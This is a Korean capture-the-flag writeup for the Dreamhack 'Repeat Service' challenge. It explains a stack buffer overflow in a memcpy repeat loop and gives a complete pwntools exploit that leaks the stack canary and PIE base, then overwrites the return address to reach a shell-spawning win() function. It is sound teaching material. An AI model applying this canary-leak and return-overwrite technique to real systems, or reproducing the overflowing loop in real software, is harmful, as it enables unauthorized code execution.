dreamhack Repeat Service writeup
===========

## 1. 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void win() {
	system("/bin/sh");
}

int main() {
	initialize();

	char inp[80] = {0};
	char buf[1000] = {0};

	puts("Welcome to the Repeat Service!");
	puts("Please put your string and length.");

	while (1) {
		printf("Pattern: ");
		int len = read(STDIN_FILENO, inp, 80);
		if (len == 0)
			break;
		if (inp[len - 1] == '\n') {
			inp[len - 1] = 0;
			len--;
		}

		int target_len = 0;
		printf("Target length: ");
		scanf("%d", &target_len);

		if (target_len > 1000) {
			puts("Too long :(");
			break;
		}

		int count = 0;
		while (count < target_len) {
			memcpy(buf + count, inp, len);
			count += len;
		}

		printf("%s\n", buf);
	}
	return 0;
}
```


코드의 while 루프 내 memcpy 부분을 보면    

```c
int count = 0;
while (count < target_len) {
    memcpy(buf + count, inp, len);
    count += len;
}
```


* 문제점: `count`가 `target_len`보다 작기만 하면 `memcpy`를 계속 수행
* 시나리오: 만약 `target_len`이 999이고, `len` (입력한 패턴의 길이)이 80이라면
1. 마지막 루프 직전 `count`는 960 .
2. `960 < 999`이므로 조건문이 참이 되어 `memcpy(buf + 960, inp, 80)`이 실행
3. 이때 데이터는 `buf[960]`부터 `buf[1039]`까지 쓰여진다.

* 결과: `buf`의 크기는 **1000 바이트**로 선언되어 있습니다. 위 시나리오에서는 인덱스 **1039**까지 데이터를 쓰게 되므로 `buf` 뒤에 존재하는 메모리 영역을 덮어쓰게 된다.



## 2. 보안 설정 (Checksec) 분석

<img width="1120" height="237" alt="image" src="https://github.com/user-attachments/assets/29a154e2-f4e7-4821-9b08-ee6808b61c17" />


* **스택 카나리:** 함수의 Return Address를 바로 덮을 수 없으며 카나리 값을 먼저 알아내거나 우회
* **PIE & Full RELRO:** 바이너리의 주소와 라이브러리 주소가 실행 시마다 변하며 GOT Overwrite가 불가능
* **SHSTK (Shadow Stack) & IBT:** 단순한 ROP(Return Oriented Programming) 시도를 하드웨어 레벨에서 차단

---

## 3. 익스플로잇 전략

이 문제의 목표는 `win()` 함수를 실행하는 것이다. 하지만 `SHSTK`가 활성화되어 있어 일반적인 ROP는 작동하지 않을 것이다. 따라서 **카나리를 보존하면서 main 함수의 로컬 변수나 제어 흐름을 조작** 해야한다.

### 1단계: 릭

먼저 Canary와 PIE 베이스 주소를 알아내야 한다.

* `buf` 바로 뒤에 카나리가 위치한다면 `target_len`을 조절해 `buf`를 꽉 채우고 널 바이트 제거해서 `printf("%s\n", buf)` 카나리와 리턴 주소를 출력하게 할 수 있다. 

### 2단계: Buffer Overflow 

`target_len`을 `1000`에 가깝게 설정하고 `len`을 크게 잡아 `buf`를 넘어 스택의 다음 영역을 정교하게 덮어씁니다.

1. **Canary 우회:** 유출한 Canary 값을 정확한 위치에 다시 써넣어 `__stack_chk_fail`을 피하기
2. **Return Address 조작:** `main`의 Return Address를 `win()` 함수의 주소로 바꾼다.



## 4. 익스플로잇 과정

### 4.1 오프셋 찾기

<img width="881" height="310" alt="image" src="https://github.com/user-attachments/assets/c3e7b6a8-953d-4aaa-bb3e-eb397dd1d372" />

<+457>: lea rcx, [rbp-0x3f0] (이후 memcpy의 목적지인 rdi로 전달됨)   
<+511>: lea rax, [rbp-0x3f0] (이후 puts의 인자인 rdi로 전달됨)   
buf는 **rbp-0x3f0**에서 시작


<img width="403" height="62" alt="image" src="https://github.com/user-attachments/assets/5848b830-6cb4-4db6-8058-9c6079bb1edd" />

Canary 위치: * <+24>: mov QWORD PTR [rbp-0x8], rax. 



buf가 1000바이트이고 카나리의 첫 바이트가 \x00인 점을 이용해 target_len=1000과 적절한 패턴 길이를 주어 카나리의 널 바이트를 덮어쓰고 puts로 읽어낼 수 있다.  
buf 시작(rbp-0x3f0)에서 Canary(rbp-0x8)까지 딱 1000바이트이므로 1001번째 바이트를 덮으면 카나리 유출


### 4.2 Code 영역(PIE Base) Leak & Partial Overwrite

PIE가 켜져 있어 win 함수의 주소를 바로 알 수 없으므로 스택에 남아있는 복귀 주소(Code 영역 주소)를 이용한다. 

<img width="987" height="283" alt="image" src="https://github.com/user-attachments/assets/199ad5ca-3651-4632-83e0-5fc3fa450a8f" />


1048바이트 뒤의 주소를 aa (0x6161)로 덮어쓰는 부분  
ASLR이 적용되어도 페이지 단위(4KB, 하위 12비트)는 변하지 않는다는 특징을 이용한다.   
하위 2바이트(16비트)를 덮으면 그중 12비트는 고정이고, 나머지 4비트(16분의 1 확률)만 맞추면 된다.   

<img width="917" height="57" alt="image" src="https://github.com/user-attachments/assets/10a1010b-8684-41ef-8772-5adcebe5816c" />



## 5. 익스플로잇 코드

```python
from pwn import *

# p = process("./main") 
p = remote("host3.dreamhack.games", 23638)
elf = ELF("./main")

# 1. Canary Leak
log.info("Step 1: Leaking Canary...")
# buf(1000) 끝의 Null 바이트를 덮어쓰기 위해 1001바이트까지 침범
# 13 * 77 = 1001. 마지막 memcpy(buf + 988, "a"*13, 13) -> buf[1000]까지 씀
p.sendlineafter(b"Pattern: ", b"a" * 13)
p.sendlineafter(b"Target length: ", b"1000")

p.recvuntil(b"a" * 1001)
canary = u64(b"\x00" + p.recv(7))
log.success(f"Canary: {hex(canary)}")

# 2. Code Base Leak (PIE)
log.info("Step 2: Leaking Code Base...")
p.sendlineafter(b"Pattern: ", b"b" * 75)
p.sendlineafter(b"Target length: ", b"1000")

p.recvuntil(b"b" * 1048)
leaked_code = u64(p.recv(6).ljust(8, b"\x00"))

code_base = leaked_code - 0x128a 
win_addr = code_base + 0x1270


# 3. Exploit (Overwrite RET)

# 마지막 루프 count=960일 때 80바이트를 복사하면 1040까지 덮음.
# buf[1000]: Canary (Offset 40)
# buf[1008]: SFP (Offset 48)
# buf[1016]: RET (Offset 56)

payload = b"A" * 40              # 960 ~ 1000
payload += p64(canary)           # 1000 ~ 1008
payload += b"B" * 8              # 1008 ~ 1016 (SFP Dummy)

# system() 함수 실행을 위한 스택 정렬(Alignment) 처리
# win(0x1270)이 아닌 win+8(0x1278)로 뛰어서 push rbp를 건너뜀
payload += p64(win_addr + 8)     # 1016 ~ 1024 (RET)
payload = payload.ljust(80, b"C") # 패턴 길이 80 유지

p.sendlineafter(b"Pattern: ", payload)
p.sendlineafter(b"Target length: ", b"1000")

# 4. Trigger & Shell
log.info("Triggering return to win()...")
p.sendlineafter(b"Pattern: ", b"exit")
p.sendlineafter(b"Target length: ", b"2000")

p.interactive()
```

## 6. 실행 결과

<img width="868" height="107" alt="image" src="https://github.com/user-attachments/assets/a35c3288-0be5-4c2a-9211-9cab457b9dfa" />


